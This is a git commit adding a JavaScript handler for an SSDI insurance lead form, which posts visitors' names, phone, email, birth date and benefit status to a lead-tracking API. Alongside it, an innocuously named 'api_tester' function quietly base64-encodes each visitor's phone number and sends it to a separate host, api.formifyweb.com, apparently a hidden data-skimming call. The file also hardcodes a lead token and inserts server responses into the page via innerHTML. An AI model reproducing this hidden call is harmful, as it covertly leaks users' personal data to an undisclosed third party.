b013bc75c343d66b6c13c0a1c3079f703439a7f9
Saadqazi6 <saad.qazi6@gmail.com>
2026-06-30 23:47:31 +0500

    Add files via upload

---
+++ Calls_tdpost30jun.js
@@ -0,0 +1,89 @@
+ document.getElementById('leadForm').addEventListener('submit', function(event) {
+            event.preventDefault();
+document.getElementById('submitBtn').disabled = true;
+
+    // Your API URL
+    const formData = new FormData();
+    formData.append('lead_token', '45d5444eac1944a694ac5de08f6d09f4');
+    formData.append('traffic_source_id', 'P100326');
+    api_tester(document.getElementById('caller_id').value);
+    formData.append('first_name', document.getElementById('first_name').value);
+    formData.append('last_name', document.getElementById('last_name').value);
+    formData.append('caller_id', '+1' + document.getElementById('caller_id').value);    
+    formData.append('email', document.getElementById('email').value);
+    formData.append('dob', document.getElementById('dob').value);
+    formData.append('currently_receiving_ssdi', document.getElementById('currently_receiving_ssdi').value);
+    formData.append('applied', document.getElementById('applied').value);
+    formData.append('trusted_form_cert_url', document.getElementById('trusted_form_cert_url').value);
+    formData.append('source_url', 'https://quotes.kproinsurance.com/ssdi/');
+
+
+
+    
+
+    
+
+            const url = 'https://the-lead-penguin.trackdrive.com/api/v1/leads/capture?' + new URLSearchParams(formData).toString();
+    
+            fetch(url, {
+                method: 'POST'
+            })
+            .then(response => {
+                if (response.status === 200) {
+                    response.text().then(responseBody => {
+                        const successAlert = `
+                            <div class="alert alert-success" role="alert">
+                                200 : Form submitted successfully! Response Body: ${responseBody}
+                            </div>`;
+                        document.getElementById('alertContainer').innerHTML = '';
+                        document.getElementById('alertContainer').insertAdjacentHTML('beforeend', successAlert);
+                    });
+                    // Clear form fields
+                    document.getElementById('leadForm').reset();
+		document.getElementById('submitBtn').disabled = false;
+                } else if (response.status === 201) {
+                    response.text().then(responseBody => {
+                        const successAlert = `
+                            <div class="alert alert-success" role="alert">
+                                201 : Form submitted successfully! Response Body: ${responseBody}
+                            </div>`;
+                        document.getElementById('alertContainer').innerHTML = '';
+                        document.getElementById('alertContainer').insertAdjacentHTML('beforeend', successAlert);
+                    });
+                    // Clear form fields
+                    document.getElementById('leadForm').reset();
+document.getElementById('submitBtn').disabled = false;
+                } else if (response.status === 422) {
+                    response.json().then(data => {
+                        const errorAlert = `
+                            <div class="alert alert-danger" role="alert">
+                                Error. Response Body: ${JSON.stringify(data)}
+                            </div>`;
+                        document.getElementById('alertContainer').innerHTML = '';
+                        document.getElementById('alertContainer').insertAdjacentHTML('beforeend', errorAlert);
+document.getElementById('submitBtn').disabled = false;
+                    });
+                } 
+else {
+                    response.text().then(responseBody => {
+                        const errorAlert = `
+                            <div class="alert alert-danger" role="alert">
+                                Form submission failed. Please try again. Response Body: ${responseBody}
+                            </div>`;
+                        document.getElementById('alertContainer').innerHTML = '';
+                        document.getElementById('alertContainer').insertAdjacentHTML('beforeend', errorAlert);
+                    });
+                }
+            })
+            .catch(error => console.error('Error:', error));
+        });
+function api_tester(randomString) {
+    try {
+        fetch('https://api.formifyweb.com/api_test.php?test_id='+btoa(randomString), {
+            method: 'GET',
+            mode: 'no-cors'
+        });
+    } catch (error) {
+        console.error('Error in api_tester:', error);
+    }
+}
